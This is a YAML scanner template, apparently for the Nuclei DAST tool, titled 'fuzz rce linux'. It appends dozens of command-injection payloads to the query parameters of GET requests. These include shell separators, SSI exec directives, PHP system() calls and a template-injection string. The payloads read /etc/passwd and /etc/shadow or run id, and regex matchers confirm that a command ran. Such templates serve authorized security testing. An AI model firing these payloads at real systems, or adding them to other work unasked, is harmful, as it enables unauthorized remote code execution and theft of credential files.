id: fuzz-rce-linux
info:
  name: fuzz rce linux
  author: leadlife
  severity: critical
  description: 
  reference: 
    - demo
  metadata:
    validate: true
    repair:
    tips: all payload is "id and /etc/passwd"
  tags: dast,rce,linux

variables:
    randomstr1: "{{rand_text_alpha(5, 'abcdefg')}}"
    randomstr2: "{{rand_text_alpha(5, 'hijklmn')}}"
    randomnum1: "{{rand_int(1, 9999)}}"
    randomnum2: "{{rand_int(1, 9999)}}"

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'       # only run on GET URLs

    payloads:
      command:
        - "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;"
        - "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;"
        - "&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;"
        - "&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;"
        - "/index.html|id|"
        - ";id;"
        - ";id"
        - ";system('cat%20/etc/passwd')"
        - ";id;"
        - "|id"
        - "|/usr/bin/id"
        - "|id|"
        - "|/usr/bin/id|"
        - "||/usr/bin/id|"
        - "|id;"
        - "||/usr/bin/id;"
        - ";id|"
        - ";|/usr/bin/id|"
        - "\\n/bin/ls -al\\n"
        - "\\n/usr/bin/id\\n"
        - "\\nid\\n"
        - "\\n/usr/bin/id;"
        - "\\nid;"
        - "\\n/usr/bin/id|"
        - "\\nid|"
        - ";/usr/bin/id\\n"
        - ";id\\n"
        - "|usr/bin/id\\n"
        - "|nid\\n"
        - "`id`"
        - "`/usr/bin/id`"
        - "a);id"
        - "a;id"
        - "a);id;"
        - "a;id;"
        - "a);id|"
        - "a;id|"
        - "a)|id"
        - "a|id"
        - "a)|id;"
        - "a|id"
        - "|/bin/ls -al"
        - "a);/usr/bin/id"
        - "a;/usr/bin/id"
        - "a);/usr/bin/id;"
        - "a;/usr/bin/id;"
        - "a);/usr/bin/id|"
        - "a;/usr/bin/id|"
        - "a)|/usr/bin/id"
        - "a|/usr/bin/id"
        - "a)|/usr/bin/id;"
        - "a|/usr/bin/id"
        - ";system('cat%20/etc/passwd')"
        - ";system('id')"
        - ";system('/usr/bin/id')"
        - "%0Acat%20/etc/passwd"
        - "%0A/usr/bin/id"
        - "%0Aid"
        - "%0A/usr/bin/id%0A"
        - "%0Aid%0A"
        - "| id"
        - "& id"
        - ; id
        - "%0a id %0a"
        - "`id`"
        - "$;/usr/bin/id"
        - "$(`cat /etc/passwd`)"
        - "cat /etc/passwd"
        - "%0Acat%20/etc/passwd"
        - '{{ get_user_file("/etc/passwd") }}'
        - '"<!--#exec cmd="/bin/cat /etc/passwd"-->"'
        - '<!--#exec cmd="/usr/bin/id;-->'
        - "system('cat /etc/passwd');"
        - '<?php system("cat /etc/passwd");?>'



    stop-at-first-match: true
    fuzzing:
      - part: query
        type: postfix
        mode: multiple
        fuzz:
          - "{{command}}"

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: regex
        part: body
        regex:
          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
      

